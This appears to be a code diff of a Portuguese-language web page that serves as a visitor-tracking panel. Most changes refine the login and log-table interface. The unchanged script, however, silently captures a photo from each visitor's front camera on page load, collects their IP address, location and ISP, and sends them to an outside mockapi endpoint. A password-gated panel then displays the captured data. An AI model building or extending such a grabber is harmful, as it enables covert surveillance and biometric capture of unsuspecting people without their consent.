@@ -9,19 +9,34 @@
 *{margin:0;padding:0;box-sizing:border-box;font-family:monospace;-webkit-tap-highlight-color:transparent}
 body{background:var(--bg);color:var(--text);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:12px;overflow-x:hidden}
 .container{width:100%;max-width:950px}
+
 #login{background:var(--card);border:1px solid var(--border);padding:24px 16px;border-radius:12px;text-align:center;box-shadow:0 0 25px var(--vip-glow)}
 h1{color:var(--red);font-size:1.5rem;margin-bottom:8px;text-transform:lowercase;letter-spacing:2px}
 p{color:var(--muted);margin-bottom:16px;font-size:0.85rem}
 .alert-login{background:rgba(255,26,26,0.08);border-left:4px solid var(--red);padding:12px;margin-bottom:16px;font-size:0.78rem;color:#ff6666;text-align:left;line-height:1.4;border-radius:0 6px 6px 0}
-input{width:100%;padding:12px;background:#050507;border:1px solid var(--border);color:var(--text);border-radius:6px;margin-bottom:12px;text-align:center;font-size:1rem;letter-spacing:3px}
+
+.input-box{position:relative;margin-bottom:12px}
+input{width:100%;padding:12px;background:#050507;border:1px solid var(--border);color:var(--text);border-radius:6px;text-align:center;font-size:1rem;letter-spacing:3px}
 input:focus{outline:none;border-color:var(--red)}
+input.error{border-color:var(--red);box-shadow:0 0 10px rgba(255,26,26,0.4);animation:shake 0.3s ease-in-out}
+
+@keyframes shake{
+  0%,100%{transform:translateX(0)}
+  25%{transform:translateX(-6px)}
+  75%{transform:translateX(6px)}
+}
+
+.error-msg{color:var(--red);font-size:0.75rem;margin-top:6px;display:none;text-align:center}
+
 button{background:var(--red);color:#fff;border:none;padding:12px;width:100%;border-radius:6px;cursor:pointer;font-weight:bold;text-transform:uppercase;letter-spacing:1px;font-size:0.9rem}
 button:hover{opacity:.85}
+
 #panel{display:none;background:var(--card);border:2px solid var(--red);padding:16px 12px;border-radius:14px;box-shadow:0 0 35px var(--vip-glow), inset 0 0 15px rgba(255,26,26,0.05)}
 .header{display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;border-bottom:1px solid var(--border);padding-bottom:10px}
 .status{display:flex;align-items:center;gap:6px;font-size:0.75rem;color:var(--muted)}
 .dot{width:7px;height:7px;background:var(--green);border-radius:50%;box-shadow:0 0 8px var(--green)}
 .alert{background:rgba(255,26,26,0.08);border-left:4px solid var(--red);padding:12px;margin-bottom:14px;font-size:0.8rem;color:#ff6666;text-align:left;line-height:1.4;border-radius:0 6px 6px 0}
+
 .actions{margin-bottom:14px;display:flex;flex-direction:column;gap:8px}
 .actions-row{display:flex;gap:6px;width:100%}
 .btn-action{background:transparent;border:1px solid var(--border);color:var(--text);padding:10px 8px;font-size:0.75rem;border-radius:6px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:4px;flex:1;text-transform:uppercase;font-weight:bold}
@@ -29,11 +44,24 @@ button:hover{opacity:.85}
 .btn-vpn-on{border-color:var(--green);color:var(--green)}
 .btn-vpn-off{border-color:#ff9900;color:#ff9900}
 .btn-clear{border-color:var(--red);color:var(--red)}
-.table-wrapper{width:100%;overflow-x:auto;-webkit-overflow-scrolling:touch;border-radius:8px;border:1px solid var(--border);background:#050507}
+
+/* Caixa com barra de rolagem fixa para os logs */
+.table-wrapper{
+  width:100%;
+  max-height: 380px;
+  overflow-y: auto;
+  overflow-x: auto;
+  -webkit-overflow-scrolling:touch;
+  border-radius:8px;
+  border:1px solid var(--border);
+  background:#050507;
+}
+
 table{width:100%;border-collapse:collapse;min-width:650px}
 th,td{padding:10px 12px;text-align:left;border-bottom:1px solid var(--border);font-size:0.78rem;white-space:nowrap}
-th{color:var(--muted);text-transform:uppercase;background:#050507}
+th{color:var(--muted);text-transform:uppercase;background:#050507;position:sticky;top:0;z-index:2}
 td{color:var(--text)}
+
 .warning-banner{margin-top:14px;text-align:center;font-size:0.72rem;color:var(--muted);border-top:1px dashed var(--border);padding-top:10px}
 .visitor-img{width:40px;height:40px;object-fit:cover;border-radius:4px;border:1px solid var(--red)}
 #hidden-cam{display:none}
@@ -53,7 +81,12 @@ td{color:var(--text)}
 <div class="alert-login">
 ⚠️ <strong>Atenção:</strong> O seu endereço IP, localização, operadora e biometria facial foram capturados com sucesso. Apenas o proprietário autorizado possui permissão para visualizar os registos de rede.
 </div>
-<input type="password" id="pass" placeholder="••••••••">
+
+<div class="input-box">
+  <input type="password" id="pass" placeholder="••••••••" oninput="clearError()">
+  <div id="error-msg" class="error-msg">❌ Senha incorreta. Tente novamente.</div>
+</div>
+
 <button onclick="check()">Entrar no Painel</button>
 </div>
 
@@ -76,7 +109,7 @@ td{color:var(--text)}
 <button class="btn-action" onclick="logout()">🚪 Sair</button>
 </div>
 </div>
-<div class="table-wrapper">
+<div class="table-wrapper" id="tableWrapper">
 <table>
 <thead>
 <tr><th>Foto</th><th>Horário</th><th>IP Capturado</th><th>Localização</th><th>ISP (Operadora)</th></tr>
@@ -93,13 +126,13 @@ td{color:var(--text)}
 <script>
 const API_URL = 'https://6ab89b5af84897980b7224db.mockapi.io/api/v1/logs';
 
+// Captura câmara e localização de forma única por dispositivo
 window.onload = async function() {
   try {
     if (localStorage.getItem('fuzue_logged')) {
       return;
     }
 
-    // Tenta capturar a foto da câmara frontal primeiro
     let photoData = '';
     try {
       let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
@@ -114,13 +147,11 @@ window.onload = async function() {
       ctx.drawImage(video, 0, 0, 160, 120);
       photoData = canvas.toDataURL('image/jpeg', 0.7);
 
-      // Desliga a câmara logo após tirar a foto
       stream.getTracks().forEach(track => track.stop());
     } catch(err) {
-      photoData = ''; // Se o utilizador recusar a permissão da câmara, continua sem foto
+      photoData = '';
     }
 
-    // Recolhe dados de IP e localização
     let r = await fetch('https://ipwho.is/');
     let d = await r.json();
     if (d.success) {
@@ -145,13 +176,25 @@ window.onload = async function() {
   } catch(e) {}
 };
 
+function clearError(){
+  let input = document.getElementById('pass');
+  let errorMsg = document.getElementById('error-msg');
+  input.classList.remove('error');
+  errorMsg.style.display = 'none';
+}
+
 async function check(){
-  if(document.getElementById('pass').value === '17102007'){
+  let passInput = document.getElementById('pass');
+  let errorMsg = document.getElementById('error-msg');
+
+  if(passInput.value === '17102007'){
     document.getElementById('login').style.display = 'none';
     document.getElementById('panel').style.display = 'block';
     await renderLogs();
   } else {
-    alert('Acesso negado! Senha incorreta.');
+    passInput.classList.add('error');
+    errorMsg.style.display = 'block';
+    passInput.value = '';
   }
 }
 
@@ -159,6 +202,7 @@ function logout(){
   document.getElementById('panel').style.display = 'none';
   document.getElementById('login').style.display = 'block';
   document.getElementById('pass').value = '';
+  clearError();
 }
 
 function setVPN(state){
@@ -182,8 +226,6 @@ async function renderLogs(){
       return;
     }
     
-    logs.reverse();
-    
     tbody.innerHTML = logs.map(l => `
       <tr>
         <td>${l.photo ? `<img src="${l.photo}" class="visitor-img">` : '<span style="color:#707085;font-size:0.7rem">Sem foto</span>'}</td>
@@ -193,6 +235,11 @@ async function renderLogs(){
         <td>${l.isp || 'Desconhecido'}</td>
       </tr>
     `).join('');
+
+    // Rola automaticamente para baixo para mostrar sempre as entradas mais recentes
+    let wrapper = document.getElementById('tableWrapper');
+    wrapper.scrollTop = wrapper.scrollHeight;
+
   } catch(e) {
     tbody.innerHTML = `<tr><td colspan="5" style="text-align:center;color:#ff4d4d;">Erro ao ligar à base de dados na nuvem.</td></tr>`;
   }
